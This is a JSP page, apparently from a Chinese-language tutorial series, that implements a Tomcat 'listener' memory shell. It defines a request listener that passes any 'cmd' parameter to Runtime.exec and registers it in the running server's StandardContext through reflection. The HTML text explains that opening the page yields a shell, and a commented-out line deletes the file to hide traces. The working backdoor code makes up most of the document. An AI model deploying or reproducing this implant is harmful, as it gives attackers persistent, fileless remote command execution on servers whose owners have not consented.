<%--
  Created by IntelliJ IDEA.
  User: ThreatBook
  Date: 2023/6/27
  Time: 17:41
  To change this template use File | Settings | File Templates.
--%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>

<%@ page import="java.io.IOException" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
>

<%!
    public class Shell_Listener implements ServletRequestListener {

        @Override
        public void requestInitialized(ServletRequestEvent sre) {
            HttpServletRequest req = (HttpServletRequest) sre.getServletRequest();
            String cmd = req.getParameter("cmd");
            if (cmd != null){
                try {
                    Runtime.getRuntime().exec(cmd);
                } catch (IOException e){
                    e.printStackTrace();
                } catch (NullPointerException n) {
                    n.printStackTrace();
                }
            }
        }

        @Override
        public void requestDestroyed(ServletRequestEvent sre) {}
    }
%>

<%
    ServletContext servletContext =  request.getSession().getServletContext();
    Field field = servletContext.getClass().getDeclaredField("context");
    field.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) field.get(servletContext);
    field = applicationContext.getClass().getDeclaredField("context");
    field.setAccessible(true);
    StandardContext standardContext = (StandardContext) field.get(applicationContext);

    Shell_Listener shell_listener = new Shell_Listener();
    standardContext.addApplicationEventListener(shell_listener);
%>




<html>
<head>
    <title>Listener 03版</title>
</head>
<body>
    <br>普通jsp直接页面返回！！<br>
    <br>注意点：使用war形式 + 配置前后缀，直接访问jsp页面!!!    即可弹shell！！！<br>


    <h3>在jsp中如何获得StandardContext对象:</h3>

    <h5>方式三：</h5>
    <p>
        // 通过反射从ApplicationContextFacade中获取到当前的StandardContext<br>
        ServletContext servletContext =  request.getSession().getServletContext();<br>
        Field field = servletContext.getClass().getDeclaredField("context");<br>
        field.setAccessible(true);<br>
        ApplicationContext applicationContext = (ApplicationContext) field.get(servletContext);<br>
        field = applicationContext.getClass().getDeclaredField("context");<br>
        field.setAccessible(true);<br>
        StandardContext standardContext = (StandardContext) field.get(applicationContext);<br>
        standardContext.addApplicationEventListener(new BackdoorListener());<br>
        // 自毁    // (new File(application.getRealPath(request.getServletPath()))).delete();<br>
    </p>
</body>
</html>
